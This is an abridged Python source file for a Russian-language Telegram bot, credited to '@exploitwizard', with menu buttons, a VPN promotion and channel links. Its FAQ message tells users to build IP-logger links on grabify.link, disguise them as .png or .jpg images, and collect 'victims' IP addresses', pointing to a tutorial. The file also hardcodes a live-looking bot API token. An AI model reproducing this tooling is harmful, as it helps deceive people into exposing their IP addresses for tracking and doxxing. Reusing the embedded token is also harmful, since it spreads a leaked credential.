# начальный СОЗДАТЕЛЬ ЭТОГО БОТА @exploitwizard

import telebot
from telegraph import Telegraph, TelegraphException
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = '8193547754:AAHZ7LmzweLyvgeGvWqAEX6QmAykd-fOxsY'
...
def send_welcome(message):
    ...
    markup.row(
        ...
        InlineKeyboardButton('⚠️ satoshi VPN', callback_data='VPN'),
        )
    markup.row(
        InlineKeyboardButton('❗️ Канал', callback_data='authors'),
        InlineKeyboardButton('✨ Шаблоны', callback_data='templates')
    )
    bot.reply_to(message, "Тапни на одну из кнопок для продолжения.", reply_markup=markup)
...
def show_faq(call):
    bot.send_message(call.message.chat.id, "Делаешь ссылку логгер в grabify.link и обязательно чтобы в конце логгера было либо .png, либо .jpg и кидай эту ссылку боту. Айпи жертв будут на сайте. Тутор: https://telegra.ph/Tutor-po-sozdaniyu-ssylki-07-21 .Если что используй еще раз /start.")

@bot.callback_query_handler(func=lambda call: call.data == 'VPN')
def show_faq(call):
    bot.send_message(call.message.chat.id, "Крутой впн который есть на Windows, Mac, Android: t.me/satoshivpn")

@bot.callback_query_handler(func=lambda call: call.data == 'authors')
def show_authors(call):
    bot.send_message(call.message.chat.id, "❔️ Канал создателя: t.me/satoshiVPN_Bio")
